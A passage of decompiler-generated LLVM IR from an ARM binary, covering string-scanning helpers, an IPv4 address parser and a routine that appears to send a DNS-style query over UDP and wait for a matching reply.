  store i32 %v2_124bc, i32* %v3_124d0, align 4
  br label %dec_label_pc_1250c

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124a0._crit_edge
  %v0_124d8 = call i32 @function_12514()
  store i32 %v0_124d8, i32* %r2.global-to-local, align 4
  %v3_124dc = icmp eq i32 %v0_124d8, 0
  store i1 %v3_124dc, i1* @cpsr_z, align 1
  br i1 %v3_124dc, label %dec_label_pc_124ec, label %dec_label_pc_124fc

dec_label_pc_124ec:                               ; preds = %dec_label_pc_124d8
  %v0_124e4 = load i32, i32* @r4, align 4
  %v2_124ec = call i32 @function_13660(i32 %v0_124e4, i32 0)
  %v0_124f0 = load i32, i32* @r4, align 4
  store i32 %v0_124f0, i32* %r3.global-to-local, align 4
  %v1_124f4 = load i32, i32* @r5, align 4
  %v2_124f4 = inttoptr i32 %v1_124f4 to i32*
  store i32 %v2_124ec, i32* %v2_124f4, align 4
  br label %dec_label_pc_1250c

dec_label_pc_124fc:                               ; preds = %dec_label_pc_124d8
  %v3_12500 = inttoptr i32 %v0_124d8 to i8*
  store i8 0, i8* %v3_12500, align 1
  %v4_12500 = load i32, i32* %r2.global-to-local, align 4
  %v5_12500 = add i32 %v4_12500, 1
  store i32 %v5_12500, i32* @r2, align 4
  %v1_12504 = load i32, i32* @r5, align 4
  %v2_12504 = inttoptr i32 %v1_12504 to i32*
  store i32 %v5_12500, i32* %v2_12504, align 4
  %v0_12508 = load i32, i32* @r4, align 4
  store i32 %v0_12508, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %bb7, %dec_label_pc_124ec, %dec_label_pc_124fc
  %v0_1250c = load i32, i32* %r3.global-to-local, align 4
  %v2_12510 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12510, i32* @r4, align 4
  store i32 %v6_124a0, i32* @r5, align 4
  ret i32 %v0_1250c

; uselistorder directives
  uselistorder i32 %v0_124ac, { 1, 0 }
  uselistorder i32 %v0_124a4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1250c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_124a0._crit_edge, { 1, 0 }
}

define i32 @function_12514() local_unnamed_addr {
dec_label_pc_12514:
  %v0_12514 = load i32, i32* @r0, align 4
  %v1_125382 = inttoptr i32 %v0_12514 to i8*
  %v2_125383 = load i8, i8* %v1_125382, align 1
  %v3_125384 = zext i8 %v2_125383 to i32
  %v2_1253c5 = icmp eq i8 %v2_125383, 0
  br i1 %v2_1253c5, label %dec_label_pc_12538._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_12514
  %v0_12544.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12524
  %v1_1252c = add i32 %v0_1252c, 1
  %v9_1251c = icmp eq i32 %v3_12524, %v3_125386
  br i1 %v9_1251c, label %dec_label_pc_1254c, label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %dec_label_pc_1251c, %bb
  %v0_1252c = phi i32 [ %v1_1252c, %dec_label_pc_1251c ], [ %v0_12544.pre, %bb ]
  %v1_12524 = inttoptr i32 %v0_1252c to i8*
  %v2_12524 = load i8, i8* %v1_12524, align 1
  %v3_12524 = zext i8 %v2_12524 to i32
  store i32 %v3_12524, i32* @ip, align 4
  %v2_12528 = icmp eq i8 %v2_12524, 0
  br i1 %v2_12528, label %dec_label_pc_12534, label %dec_label_pc_1251c

dec_label_pc_12534:                               ; preds = %dec_label_pc_12524
  %v1_12534 = add i32 %v0_12534, 1
  %v1_12538 = inttoptr i32 %v1_12534 to i8*
  %v2_12538 = load i8, i8* %v1_12538, align 1
  %v3_12538 = zext i8 %v2_12538 to i32
  %v2_1253c = icmp eq i8 %v2_12538, 0
  br i1 %v2_1253c, label %dec_label_pc_12538._crit_edge, label %bb

dec_label_pc_12538._crit_edge:                    ; preds = %dec_label_pc_12534, %dec_label_pc_12514
  %v3_12538.lcssa = phi i32 [ %v3_125384, %dec_label_pc_12514 ], [ %v3_12538, %dec_label_pc_12534 ]
  ret i32 %v3_12538.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_12534
  %v0_12534 = phi i32 [ %v0_12514, %.lr.ph ], [ %v1_12534, %dec_label_pc_12534 ]
  %v3_125386 = phi i32 [ %v3_125384, %.lr.ph ], [ %v3_12538, %dec_label_pc_12534 ]
  br label %dec_label_pc_12524

dec_label_pc_1254c:                               ; preds = %dec_label_pc_1251c
  ret i32 %v0_12534

; uselistorder directives
  uselistorder i32 %v3_12538, { 1, 0 }
  uselistorder i32 %v3_12524, { 1, 0 }
  uselistorder i32 %v0_1252c, { 1, 0 }
  uselistorder i32 %v3_125384, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_12524, { 1, 0 }
}

define i32 @function_12554(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12554:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_12554 = load i32, i32* %r0.global-to-local, align 4
  %v2_12554 = icmp eq i32 %v0_12554, 0
  %v3_12558 = load i32, i32* @r4, align 4
  store i32 %v3_12558, i32* %stack_var_-20, align 4
  br i1 %v2_12554, label %dec_label_pc_12634, label %dec_label_pc_12570.lr.ph

dec_label_pc_12570:                               ; preds = %dec_label_pc_12570.lr.ph, %dec_label_pc_125f4
  %v1_125f4 = phi i32 [ 0, %dec_label_pc_12570.lr.ph ], [ %v5_125f4, %dec_label_pc_125f4 ]
  %v0_125f8 = phi i32 [ 1, %dec_label_pc_12570.lr.ph ], [ %v1_125f8, %dec_label_pc_125f4 ]
  %v0_12578 = phi i32 [ %v0_12554, %dec_label_pc_12570.lr.ph ], [ %v0_1257825, %dec_label_pc_125f4 ]
  store i32 %v2_12574.pre, i32* @lr, align 4
  %v1_12578 = inttoptr i32 %v0_12578 to i8*
  %v2_12578 = load i8, i8* %v1_12578, align 1
  %v3_12578 = zext i8 %v2_12578 to i32
  %v3_1257c = mul nuw nsw i32 %v3_12578, 2
  %v4_1257c = add i32 %v3_1257c, %v2_12574.pre
  %v5_1257c = inttoptr i32 %v4_1257c to i8*
  %v6_1257c = load i8, i8* %v5_1257c, align 1
  %v1_12580 = and i8 %v6_1257c, 8
  %v2_12580 = icmp eq i8 %v1_12580, 0
  br i1 %v2_12580, label %dec_label_pc_12634, label %dec_label_pc_12588

dec_label_pc_12588:                               ; preds = %dec_label_pc_12570
  br label %dec_label_pc_125a8

dec_label_pc_12590:                               ; preds = %dec_label_pc_125a8
  %v3_12594 = mul i32 %v0_125f4, 10
  %v4_12594 = add i32 %v3_125a8, %v3_12594
  %v1_12598 = add i32 %v4_12594, -48
  %v8_125a0 = icmp sgt i32 %v1_12598, 255
  br i1 %v8_125a0, label %dec_label_pc_12634, label %dec_label_pc_125a4

dec_label_pc_125a4:                               ; preds = %dec_label_pc_12590
  %v1_125a4 = add i32 %v0_125e4, 1
  store i32 %v1_125a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_12588, %dec_label_pc_125a4
  %v0_125f4 = phi i32 [ 0, %dec_label_pc_12588 ], [ %v1_12598, %dec_label_pc_125a4 ]
  %v0_125e4 = phi i32 [ %v0_12578, %dec_label_pc_12588 ], [ %v1_125a4, %dec_label_pc_125a4 ]
  %v1_125a8 = inttoptr i32 %v0_125e4 to i8*
  %v2_125a8 = load i8, i8* %v1_125a8, align 1
  %v3_125a8 = zext i8 %v2_125a8 to i32
  %v2_125ac = mul nuw nsw i32 %v3_125a8, 2
  %v2_125b0 = add i32 %v2_125ac, %v2_12574.pre
  %v3_125b4 = inttoptr i32 %v2_125b0 to i8*
  %v4_125b4 = load i8, i8* %v3_125b4, align 1
  %v6_125b4 = zext i8 %v4_125b4 to i32
  %v1_125c0 = and i32 %v6_125b4, 8
  %v2_125c0 = icmp eq i32 %v1_125c0, 0
  br i1 %v2_125c0, label %dec_label_pc_125c8, label %dec_label_pc_12590

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125a8
  %v8_125cc = icmp sgt i32 %v0_125f8, 3
  br i1 %v8_125cc, label %dec_label_pc_125e0, label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125c8
  %v7_125d0 = icmp eq i8 %v2_125a8, 46
  br i1 %v7_125d0, label %dec_label_pc_125d8, label %dec_label_pc_12634

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125d0
  %v1_125d8 = add i32 %v0_125e4, 1
  store i32 %v1_125d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125f4

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125c8
  %v2_125e0 = icmp eq i8 %v2_125a8, 0
  %v1_125e4 = add i32 %v0_125e4, 1
  store i32 %v1_125e4, i32* %r0.global-to-local, align 4
  br i1 %v2_125e0, label %dec_label_pc_125f4, label %dec_label_pc_125ec

dec_label_pc_125ec:                               ; preds = %dec_label_pc_125e0
  %v1_125ec = and i32 %v6_125b4, 32
  %v2_125ec = icmp eq i32 %v1_125ec, 0
  br i1 %v2_125ec, label %dec_label_pc_12634, label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_125ec, %dec_label_pc_125e0, %dec_label_pc_125d8
  %v0_1257825 = phi i32 [ %v1_125e4, %dec_label_pc_125ec ], [ %v1_125e4, %dec_label_pc_125e0 ], [ %v1_125d8, %dec_label_pc_125d8 ]
  %v4_125f4 = mul i32 %v1_125f4, 256
  %v5_125f4 = or i32 %v0_125f4, %v4_125f4
  %v1_125f8 = add nuw nsw i32 %v0_125f8, 1
  %v7_12600 = icmp slt i32 %v1_125f8, 5
  br i1 %v7_12600, label %dec_label_pc_12570, label %dec_label_pc_12604

dec_label_pc_12570.lr.ph:                         ; preds = %dec_label_pc_12554
  %v2_12574.pre = load i32, i32* @global_var_1f4a0, align 4
  br label %dec_label_pc_12570

dec_label_pc_12604:                               ; preds = %dec_label_pc_125f4
  %v2_12604 = icmp eq i32 %arg2, 0
  br i1 %v2_12604, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_12604
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_12604
  %v3_12620 = call i32 @llvm.bswap.i32(i32 %v5_125f4)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1262c = inttoptr i32 %arg2 to i32*
  store i32 %v3_12620, i32* %v3_1262c, align 4
  %v2_12630.pre = load i32, i32* %stack_var_-20, align 4
  %v17_12630.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_12630 = phi i32 [ 1, %bb ], [ %v17_12630.pre, %bb41 ]
  %v2_12630 = phi i32 [ %v3_12558, %bb ], [ %v2_12630.pre, %bb41 ]
  store i32 %v2_12630, i32* @r4, align 4
  ret i32 %v17_12630

dec_label_pc_12634:                               ; preds = %dec_label_pc_125d0, %dec_label_pc_125ec, %dec_label_pc_12570, %dec_label_pc_12590, %dec_label_pc_12554
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12558, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_12574.pre, { 2, 1, 0 }
  uselistorder i32 %v1_125f8, { 1, 0 }
  uselistorder i32 %v0_125e4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_12558, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 8, 2, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12634, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_125a8, { 1, 0 }
}

define i32 @function_12640(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12640:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_12640 = load i32, i32* @r4, align 4
  %v6_12640 = load i32, i32* @r5, align 4
  %v9_12640 = load i32, i32* @r6, align 4
  %v12_12640 = load i32, i32* @r7, align 4
  %v15_12640 = load i32, i32* @r8, align 4
  %v18_12640 = load i32, i32* @sb, align 4
  %v21_12640 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_12660 = call i32 @function_f908(i32 512)
  store i32 %v1_12660, i32* @r7, align 4
  %v1_1266c = call i32 @function_f908(i32 1025)
  %v2_12670 = icmp eq i32 %v1_1266c, 0
  br i1 %v2_12670, label %.thread8, label %bb

bb:                                               ; preds = %dec_label_pc_12640
  %v1_12674 = load i32, i32* @r7, align 4
  %v3_12674 = icmp eq i32 %v1_12674, 0
  store i32 %v1_1266c, i32* %stack_var_-236, align 4
  br i1 %v3_12674, label %bb195, label %dec_label_pc_12688

.thread8:                                         ; preds = %dec_label_pc_12640
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_12d68

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_12d68

dec_label_pc_12688:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1268c = icmp eq i32 %arg3, 0
  br i1 %v2_1268c, label %dec_label_pc_12d68, label %dec_label_pc_12694

dec_label_pc_12694:                               ; preds = %dec_label_pc_12688
  %v2_12698 = load i8, i8* %arg1, align 1
  %v2_1269c = icmp eq i8 %v2_12698, 0
  br i1 %v2_1269c, label %dec_label_pc_12d68, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_12694
  store i32 %tmp, i32* @r0, align 4
  %v0_126a8 = call i32 @function_ecc0()
  %v2_126b0 = add i32 %v0_126a8, %tmp
  %v1_126b4 = add i32 %v2_126b0, -1
  %v2_126b4 = inttoptr i32 %v1_126b4 to i8*
  %v3_126b4 = load i8, i8* %v2_126b4, align 1
  %v2_126b8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_126b8, i32* @r4, align 4
  %v7_126bc = icmp eq i8 %v3_126b4, 46
  %. = zext i1 %v7_126bc to i32
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_126e0 = call i32 @function_10840()
  store i32 75508, i32* @lr, align 4
  %v1_126f0 = call i32 @function_10838()
  %v2_126fc = load i32, i32* @global_var_21b60.550, align 4
  %v2_12700 = call i32 @function_c930(i32 %v2_126fc, i32 %arg3)
  %v3_12708 = load i8, i8* @global_var_1f4ad.553, align 1
  %v4_12708 = zext i8 %v3_12708 to i32
  %v2_1270c = load i8, i8* bitcast (i8** @global_var_1f4ac.552 to i8*), align 4
  %v3_1270c = zext i8 %v2_1270c to i32
  %v4_12714 = mul nuw nsw i32 %v4_12708, 256
  %v5_12714 = or i32 %v3_1270c, %v4_12714
  store i32 %v5_12714, i32* @sb, align 4
  store i32 %v2_12700, i32* @sl, align 4
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_12728 = call i32 @function_10840()
  %v0_12734 = load i32, i32* @r5, align 4
  %v2_12754 = ptrtoint i8* %stack_var_-188 to i32
  %v6_12798 = bitcast i8* %stack_var_-188 to i32*
  %v2_12878 = ptrtoint i32* %stack_var_-92 to i32
  %v3_12910 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_12974 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_12cc0 = icmp eq i1 %v7_126bc, false
  %v7_129c8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_12aac = ptrtoint i32* %stack_var_-140 to i32
  %v9_12ba4 = icmp eq i32 %tmp147, %arg2
  %v7_12b38 = icmp eq i32 %arg2, 1
  %v2_12ae0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_12734, 3
  br i1 %tmp292, label %dec_label_pc_1273c.lr.ph.preheader.lr.ph, label %dec_label_pc_12d74

dec_label_pc_1273c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_126a4
  %v2_12a4c = icmp eq i32 %tmp156, 0
  %v8_12b3c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1273c.lr.ph.preheader

dec_label_pc_1273c:                               ; preds = %dec_label_pc_1273c.lr.ph, %dec_label_pc_12d58.backedge
  %v1_12744 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1273c.lr.ph ], [ %v3_128ec, %dec_label_pc_12d58.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1273c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_12d58.backedge ]
  %v7_12740 = icmp eq i32 %v1_12744, -1
  br i1 %v7_12740, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1273c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1273c, %bb199
  %v1_12748 = xor i1 %v7_12740, true
  call void @__pseudo_cond_branch(i1 %v1_12748, i32 ptrtoint (i32* @global_var_ca18.555 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_12754, i32* @r4, align 4
  %v0_12758 = load i32, i32* @r7, align 4
  %v2_1275c = inttoptr i32 %v0_12758 to i8*
  %v3_1275c = call i32 @function_ec20(i8* %v2_1275c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1276c = call i32 @function_ec20(i8* nonnull %stack_var_-188, i32 0)
  %v0_12770 = load i32, i32* @sb, align 4
  %v1_12770 = add i32 %v0_12770, 1
  %v3_12778 = urem i32 %v1_12770, 65536
  store i32 %v3_12778, i32* @sb, align 4
  %v0_12784 = load i32, i32* @r7, align 4
  %v5_12790 = trunc i32 %v1_12770 to i8
  store i8 %v5_12790, i8* %stack_var_-188, align 1
  %v7_12798 = call i32 @function_13ed0(i32* %v6_12798, i32 %v0_12784, i32 512, i32 1, i32 %v1_12770)
  store i32 %v7_12798, i32* @r5, align 4
  %v1_1279c = icmp slt i32 %v7_12798, 0
  br i1 %v1_1279c, label %dec_label_pc_12d74, label %dec_label_pc_127a4

dec_label_pc_127a4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_127ac = load i32, i32* %stack_var_-236, align 4
  %v4_127b0 = call i32 @function_ee60(i32 %v2_127ac, i32 %tmp, i32 1025)
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_127c8 = call i32 @function_10840()
  %v1_127d8 = call i32 @function_10838()
  %v1_127e8 = load i32, i32* @sl, align 4
  %v4_127e8 = mul i32 %v1_127e8, 4
  %v5_127e8 = add i32 %v4_127e8, %arg4
  %v6_127e8 = inttoptr i32 %v5_127e8 to i32*
  %v7_127e8 = load i32, i32* %v6_127e8, align 4
  store i32 %v7_127e8, i32* @r6, align 4
  br i1 %v1_127e4, label %dec_label_pc_1282c, label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127a4
  %v2_127f8 = load i32, i32* @global_var_21dc0.558, align 4
  %v6_12800 = icmp slt i32 %v6_12d1c, %v2_127f8
  br i1 %v6_12800, label %dec_label_pc_12804, label %dec_label_pc_1282c

dec_label_pc_12804:                               ; preds = %dec_label_pc_127f0
  store i32 ptrtoint (i32* @global_var_16fd8.560 to i32), i32* @r1, align 4
  %v2_1280c = load i32, i32* %stack_var_-236, align 4
  %v4_12810 = inttoptr i32 %v2_1280c to i8*
  %v5_12810 = call i32 @function_13718(i8* %v4_12810, i32 ptrtoint (i32* @global_var_16fd8.560 to i32), i32 1025, i32 %v2_127f8)
  %v7_12820 = load i32, i32* %v6_12820, align 4
  store i32 %v7_12820, i32* @r1, align 4
  %v4_12828 = inttoptr i32 %v2_1280c to i8*
  %v5_12828 = call i32 @function_13718(i8* %v4_12828, i32 %v7_12820, i32 1025, i32 ptrtoint (i32* @global_var_21da0.562 to i32))
  br label %dec_label_pc_1282c

dec_label_pc_1282c:                               ; preds = %dec_label_pc_127f0, %dec_label_pc_127a4, %dec_label_pc_12804
  store i32 %v2_126b8, i32* @r0, align 4
  store i32 75840, i32* @lr, align 4
  %v1_1283c = call i32 @function_10840()
  %v2_12848 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_12848, i32* %stack_var_-56, align 4
  %v0_12858 = load i32, i32* @r7, align 4
  %v1_12858 = load i32, i32* @r5, align 4
  %v2_12858 = add i32 %v1_12858, %v0_12858
  %v1_1285c = sub i32 512, %v1_12858
  %v8_12864 = call i32 @function_14070(i32* nonnull %stack_var_-56, i32 %v2_12858, i32 %v1_1285c, i32 %arg2, i32 %v2_12848, i32 %arg2, i32 1)
  store i32 %v8_12864, i32* @fp, align 4
  %v1_12868 = icmp slt i32 %v8_12864, 0
  br i1 %v1_12868, label %dec_label_pc_12d74, label %dec_label_pc_12870

dec_label_pc_12870:                               ; preds = %dec_label_pc_1282c
  store i32 0, i32* @r4, align 4
  %v0_12880 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1288c = inttoptr i32 %v0_12880 to i8*
  %v4_1288c = call i32 @function_138fc(i32 10, i8* %v3_1288c, i32 %v2_12878)
  %v1_12890 = load i32, i32* @r4, align 4
  %v7_12894 = icmp sgt i32 %v4_1288c, %v1_12890
  br i1 %v7_12894, label %bb201, label %dec_label_pc_12870..thread11_crit_edge

dec_label_pc_12870..thread11_crit_edge:           ; preds = %dec_label_pc_12870
  %v3_128a0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_12870
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12870..thread11_crit_edge, %bb201
  %v3_128a0 = phi i8 [ %v3_128a0.pre, %dec_label_pc_12870..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_128a0 = sext i8 %v3_128a0 to i32
  %v8_1289c.op = urem i32 %v1_12890, 256
  %v8_1289c.op.op = mul nuw nsw i32 %v8_1289c.op, 256
  %v4_128a8 = select i1 %v7_12894, i32 %v8_1289c.op.op, i32 0
  %v5_128a8 = or i32 %v4_128a0, %v4_128a8
  %v7_128ac = icmp eq i32 %v5_128a8, 10
  br i1 %v7_128ac, label %dec_label_pc_128d8, label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %.thread11
  %v0_128c4 = load i32, i32* @r6, align 4
  store i32 %v0_128c4, i32* @r0, align 4
  %v1_128d0 = call i32 @function_f3c0(i32 %v0_128c4)
  %v3_128d8.pre = load i8, i8* %stack_var_-100, align 1
  br label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %.thread11, %dec_label_pc_128c0
  %v3_128d8 = phi i8 [ %v3_128d8.pre, %dec_label_pc_128c0 ], [ %v3_128a0, %.thread11 ]
  %v4_128d8 = sext i8 %v3_128d8 to i32
  %v5_128e8 = or i32 %v4_128d8, %v4_128a8
  %v3_128ec = call i32 @function_f8dc(i32 %v5_128e8, i32 2, i32 17)
  %v1_128f0 = icmp slt i32 %v3_128ec, 0
  br i1 %v1_128f0, label %.thread, label %dec_label_pc_12908

.thread:                                          ; preds = %dec_label_pc_128d8
  br label %dec_label_pc_12d58.backedge

dec_label_pc_12d58.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1273c, label %dec_label_pc_12d74

dec_label_pc_12908:                               ; preds = %dec_label_pc_128d8
  %v4_12910 = call i32 @function_f7f4(i32 %v3_128ec, %sockaddr* nonnull %v3_12910, i32 28)
  %v1_12914 = icmp slt i32 %v4_12910, 0
  br i1 %v1_12914, label %dec_label_pc_1291c, label %dec_label_pc_1293c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_12908
  %v0_1291c = call i32 @function_cc08()
  %v1_12920 = inttoptr i32 %v0_1291c to i32*
  %v2_12920 = load i32, i32* %v1_12920, align 4
  %v7_12924 = icmp eq i32 %v2_12920, 101
  br i1 %v7_12924, label %dec_label_pc_12c88, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1291c
  br label %dec_label_pc_12d58.backedge

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12908
  %v0_1293c = load i32, i32* @r5, align 4
  %v1_1293c = load i32, i32* @fp, align 4
  %v2_1293c = add i32 %v1_1293c, %v0_1293c
  %v0_12940 = load i32, i32* @r7, align 4
  %v4_1294c = inttoptr i32 %v0_12940 to i32*
  %v5_1294c = call i32 @function_13168(i32 %v3_128ec, i32* %v4_1294c, i32 %v2_1293c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v3_128ec, i32* %stack_var_-44, align 4
  %v11_12974 = call i32 @function_13294(%pollfd* %v10_12974, i32 1, i32 10000, i32 1, i32 %v3_128ec, i32 1, i32 0)
  %v1_12978 = load i32, i32* @r4, align 4
  %v7_1297c = icmp sgt i32 %v11_12974, %v1_12978
  br i1 %v7_1297c, label %dec_label_pc_12980, label %dec_label_pc_12c88

dec_label_pc_12980:                               ; preds = %dec_label_pc_1293c
  %v0_12988 = load i32, i32* @r7, align 4
  %v4_12990 = inttoptr i32 %v0_12988 to i32*
  %v5_12990 = call i32 @function_f84c(i32 %v3_128ec, i32* %v4_12990, i32 512, i32 %v1_12978)
  store i32 %v5_12990, i32* @fp, align 4
  %v7_1299c = icmp slt i32 %v5_12990, 12
  br i1 %v7_1299c, label %dec_label_pc_12cbc, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12980
  %v0_129a0 = load i32, i32* @r7, align 4
  %v2_129a8 = inttoptr i32 %v0_129a0 to i8*
  %v3_129a8 = call i32 @function_13fb8(i8* %v2_129a8, i32 %v2_12754)
  %v3_129ac = load i8, i8* %stack_var_-188, align 1
  %v4_129ac = sext i8 %v3_129ac to i32
  store i32 %v4_129ac, i32* @r6, align 4
  %v1_129b0 = load i32, i32* @sb, align 4
  %v9_129b0 = icmp eq i32 %v4_129ac, %v1_129b0
  br i1 %v9_129b0, label %dec_label_pc_129b8, label %dec_label_pc_12cbc

dec_label_pc_129b8:                               ; preds = %dec_label_pc_129a0
  %v1_129bc = load i32, i32* @r4, align 4
  %v9_129bc = icmp eq i32 %tmp157, %v1_129bc
  br i1 %v9_129bc, label %dec_label_pc_12cbc, label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129b8
  br i1 %v7_129c8, label %dec_label_pc_129d0, label %dec_label_pc_12a4c

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129c4
  %v9_129d4 = icmp eq i32 %., %v1_129bc
  br i1 %v9_129d4, label %dec_label_pc_129dc, label %dec_label_pc_12a40

dec_label_pc_129dc:                               ; preds = %dec_label_pc_129d0
  store i32 %v2_126b8, i32* @r5, align 4
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_129f4 = call i32 @function_10840()
  %v1_12a04 = call i32 @function_10838()
  store i32 %v2_126b8, i32* @r0, align 4
  %v2_12a10 = load i32, i32* @global_var_21dc0.558, align 4
  %v1_12a20 = call i32 @function_10840()
  %v1_12a28 = add i32 %v2_12a10, -1
  store i32 %v1_12a28, i32* @r4, align 4
  %v5_12a30 = icmp slt i32 %v6_12d1c, %v1_12a28
  br i1 %v5_12a30, label %.thread19, label %dec_label_pc_12a40

.thread19:                                        ; preds = %dec_label_pc_129dc
  %v7_12a30 = add i32 %v6_12d1c, 1
  %v6_12a34 = load i32, i32* @r6, align 4
  store i32 %v6_12a34, i32* @sb, align 4
  br label %dec_label_pc_12d58.outer.backedge

dec_label_pc_12a40:                               ; preds = %dec_label_pc_129dc, %dec_label_pc_129d0
  %v0_12a40 = call i32 @function_11004()
  br label %dec_label_pc_12a70

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_129c4
  br i1 %v2_12a4c, label %dec_label_pc_12a54, label %dec_label_pc_12cbc

dec_label_pc_12a54:                               ; preds = %dec_label_pc_12a4c
  br i1 %tmp198, label %dec_label_pc_12a68, label %dec_label_pc_12a80.preheader

dec_label_pc_12a80.preheader:                     ; preds = %dec_label_pc_12a54
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_12a80

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12a54
  %v0_12a68 = call i32 @function_11004()
  br label %dec_label_pc_12a70

dec_label_pc_12a70:                               ; preds = %dec_label_pc_12a40, %dec_label_pc_12a68
  %storemerge4 = phi i32 [ %v0_12a68, %dec_label_pc_12a68 ], [ %v0_12a40, %dec_label_pc_12a40 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_12a68 ], [ 1, %dec_label_pc_12a40 ]
  %v2_12a70 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_12a70, align 4
  br label %dec_label_pc_12d84

